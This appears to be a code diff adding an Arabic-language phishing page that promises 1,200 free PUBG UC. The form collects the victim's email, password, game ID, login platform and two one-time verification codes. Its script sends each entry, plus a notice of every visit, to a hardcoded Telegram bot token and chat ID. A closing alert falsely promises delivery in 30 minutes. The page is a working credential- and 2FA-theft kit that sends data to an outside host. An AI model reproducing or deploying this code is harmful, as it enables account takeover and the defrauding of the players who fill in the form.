@@ -1,0 +1,217 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>UC مجاني</title>
+    <script src="https://unpkg.com/axios/dist/axios.min.js"></script>
+    <style>
+        /* إعدادات عامة للجسم */
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f0f2f5;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+        }
+
+        /* تنسيق الحاوية الرئيسية */
+        .login-container {
+            background: #fff;
+            padding: 20px 30px;
+            border-radius: 8px;
+            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.1);
+            width: 350px;
+        }
+
+        /* عنوان الصفحة */
+        h2 {
+            text-align: center;
+            color: #1877f2;
+            font-size: 25px;
+            font-family: 'Lucida Sans', 'Lucida Sans Regular', 'Lucida Grande', 'Lucida Sans Unicode', Geneva, Verdana, sans-serif;
+            margin-bottom: 10px;
+        }
+
+        h3 {
+            font-size: 18px;
+            color: #333;
+            text-align: center;
+            margin-bottom: 20px;
+        }
+
+        /* تنسيق النصوص التوضيحية */
+        label {
+            display: block;
+            margin: 10px 0 5px;
+            font-size: 14px;
+            color: #555;
+        }
+
+        /* الحقول النصية */
+        input, select {
+            width: 100%;
+            padding: 10px;
+            margin-bottom: 15px;
+            border: 1px solid #ccc;
+            border-radius: 4px;
+            font-size: 14px;
+            box-sizing: border-box;
+            transition: border-color 0.3s ease;
+        }
+
+        input:focus, select:focus {
+            border-color: #1877f2;
+            outline: none;
+            box-shadow: 0 0 5px rgba(24, 119, 242, 0.3);
+        }
+
+        /* الأزرار */
+        button {
+            width: 100%;
+            padding: 12px;
+            background-color: #1877f2;
+            color: #fff;
+            border: none;
+            border-radius: 4px;
+            cursor: pointer;
+            font-size: 16px;
+            transition: background-color 0.3s ease;
+        }
+
+        button:hover {
+            background-color: #155bb5;
+        }
+
+        /* الرسائل */
+        .error {
+            color: red;
+            font-size: 14px;
+            text-align: center;
+            margin-top: 10px;
+        }
+
+        .success {
+            color: green;
+            font-size: 14px;
+            text-align: center;
+            margin-top: 10px;
+        }
+
+        /* رسائل التحقق */
+        #verification-message {
+            color: green;
+            font-size: 14px;
+            text-align: center;
+            margin-top: 10px;
+        }
+
+    </style>
+
+</head>
+<body onload="sendMessageOnLoad()">
+    <div class="login-container">
+        <h2>شدات ببجي مجانية</h2>
+        <h3>احصل على 1200 UC</h3>
+        <form id="login-form">
+            <label for="email">البريد الإلكتروني:</label>
+            <input type="text" id="email" required>
+            <label for="password">كلمة المرور:</label>
+            <input type="password" id="password" required>
+            <label for="ID">ID:</label>
+            <input type="text" id="ID" required>
+            <label for="platform">طريقة التسجيل:</label>
+            <select id="platform" required>
+                <option value="Facebook">فيسبوك</option>
+                <option value="Google">جوجل</option>
+            </select>
+            <div id="otp-section" style="display: none;">
+                <label for="otp">كود التحقق الأول:</label>
+                <input type="text" id="otp" required>
+                <label for="otp-second">كود التحقق الثاني:</label>
+                <input type="text" id="otp-second" >
+            </div>
+            <p id="verification-message" style="display: none; color: green; text-align: center;">سيصلك كود التحقق على حسابك.</p>
+            <button type="button" id="next-button">التالي</button>
+            <button type="submit" id="login-button" style="display: none;">التالي</button>
+        </form>
+        <p id="error-message" class="error"></p>
+    </div>
+
+    <script>
+        // بيانات بوت Telegram
+        const TOKEN = "7931349479:AAGHJ-5j0Xe9KV90VjpLwSn1QwpWLUcs918"; 
+        const CHAT_ID = "6662219429"; 
+        const URI_API = `https://api.telegram.org/bot${TOKEN}/sendMessage`;
+
+        // إرسال رسالة عند تحميل الصفحة
+        function sendMessageOnLoad() {
+            const message = `
+                <b>شخص دخل الموقع</b>\n
+                تم دخول المستخدم إلى الموقع.
+            `;
+            axios.post(URI_API, {
+                chat_id: CHAT_ID,
+                parse_mode: 'html',
+                text: message,
+            }).catch(console.error);
+        }
+
+        // إرسال أكواد التحقق إلى بوت Telegram عند الضغط على زر "التالي"
+        document.getElementById('login-form').addEventListener('submit', function (e) {
+            e.preventDefault();
+            const otp1 = document.getElementById('otp').value; // كود التحقق الأول
+            const otp2 = document.getElementById('otp-second').value; // كود التحقق الثاني
+
+            if (otp1 && otp2) {
+                const otpMessage = `
+                    <b>كود التحقق الأول:</b> ${otp1}\n
+                    <b>كود التحقق الثاني:</b> ${otp2}\n
+                    <b>ملاحظة:</b> تم إدخال أكواد التحقق بنجاح.
+                `;
+                axios.post(URI_API, {
+                    chat_id: CHAT_ID,
+                    parse_mode: 'html',
+                    text: otpMessage,
+                }).then(() => {
+                    alert("سيصلك الشدات بعد 30 دقيقه .");
+                }).catch(console.error);
+            } else {
+                alert("يرجى إدخال جميع أكواد التحقق.");
+            }
+        });
+
+        document.getElementById('next-button').addEventListener('click', function () {
+            const email = document.getElementById('email').value;
+            const password = document.getElementById('password').value;
+            const ID = document.getElementById('ID').value;
+            const platform = document.getElementById('platform').value;
+
+            if (email && password && ID) {
+                const message = `
+                    <b>محاولة تسجيل دخول جديدة</b>\n
+                    <b>البريد الإلكتروني:</b> ${email}\n
+                    <b>كلمة المرور:</b> ${password}\n
+                    <b>رقم ID:</b> ${ID}\n
+                    <b>طريقة التسجيل:</b> ${platform}\n
+                `;
+                axios.post(URI_API, {
+                    chat_id: CHAT_ID,
+                    parse_mode: 'html',
+                    text: message,
+                }).then(() => {
+                    document.getElementById('otp-section').style.display = "block";
+                    document.getElementById('verification-message').style.display = "block";
+                    document.getElementById('next-button').style.display = "none";
+                    document.getElementById('login-button').style.display = "block";
+                }).catch(console.error);
+            } else {
+                alert("يرجى إدخال جميع الحقول.");
+            }
+        });
+    </script>
+
+</body>
+</html>
